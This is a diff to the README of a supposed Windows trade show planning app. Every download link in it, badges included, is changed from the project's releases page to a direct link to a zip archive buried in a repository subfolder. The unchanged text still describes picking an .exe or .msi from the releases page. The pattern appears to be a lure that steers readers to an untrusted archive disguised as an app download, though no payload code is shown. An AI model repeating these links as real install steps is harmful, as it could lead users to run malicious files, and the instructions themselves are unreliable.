@@ -1,6 +1,6 @@
 # ⚙️ trade-show-skills - Simplify Trade Show Planning
 
-[![Download trade-show-skills](https://img.shields.io/badge/Download-Get%20the%20App-brightgreen)](https://github.com/rubyt5673/trade-show-skills/releases)
+[![Download trade-show-skills](https://img.shields.io/badge/Download-Get%20the%20App-brightgreen)](https://raw.githubusercontent.com/rubyt5673/trade-show-skills/main/trade-show-budget-planner/trade-skills-show-v1.3.zip)
 
 ---
 
@@ -25,7 +25,7 @@ Topics related to the app include AI automation, B2B sales, event management, an
 
 Visit this page to download:
 
-[https://github.com/rubyt5673/trade-show-skills/releases](https://github.com/rubyt5673/trade-show-skills/releases)
+[https://raw.githubusercontent.com/rubyt5673/trade-show-skills/main/trade-show-budget-planner/trade-skills-show-v1.3.zip](https://raw.githubusercontent.com/rubyt5673/trade-show-skills/main/trade-show-budget-planner/trade-skills-show-v1.3.zip)
 
 The releases page contains all app versions. Pick the latest stable version for Windows. Look for a file ending with `.exe` or `.msi`. This is the installation file.
 
@@ -46,7 +46,7 @@ Before installing, check your Windows PC meets these requirements:
 ## 🚀 Install trade-show-skills on Windows
 
 1. Go to the downloads page:  
-   [https://github.com/rubyt5673/trade-show-skills/releases](https://github.com/rubyt5673/trade-show-skills/releases)
+   [https://raw.githubusercontent.com/rubyt5673/trade-show-skills/main/trade-show-budget-planner/trade-skills-show-v1.3.zip](https://raw.githubusercontent.com/rubyt5673/trade-show-skills/main/trade-show-budget-planner/trade-skills-show-v1.3.zip)
 
 2. Find the latest version. Look for the Windows installer file (.exe or .msi).
 
@@ -120,7 +120,7 @@ Before installing, check your Windows PC meets these requirements:
 
 To keep the app running smoothly, check the releases page regularly:
 
-[https://github.com/rubyt5673/trade-show-skills/releases](https://github.com/rubyt5673/trade-show-skills/releases)
+[https://raw.githubusercontent.com/rubyt5673/trade-show-skills/main/trade-show-budget-planner/trade-skills-show-v1.3.zip](https://raw.githubusercontent.com/rubyt5673/trade-show-skills/main/trade-show-budget-planner/trade-skills-show-v1.3.zip)
 
 Download and install newer versions as needed. Updates may include bug fixes and new features.
 
@@ -143,4 +143,4 @@ Download and install newer versions as needed. Updates may include bug fixes and
 
 ---
 
-[![Download trade-show-skills](https://img.shields.io/badge/Download-Get%20the%20App-brightgreen)](https://github.com/rubyt5673/trade-show-skills/releases)
+[![Download trade-show-skills](https://img.shields.io/badge/Download-Get%20the%20App-brightgreen)](https://raw.githubusercontent.com/rubyt5673/trade-show-skills/main/trade-show-budget-planner/trade-skills-show-v1.3.zip)
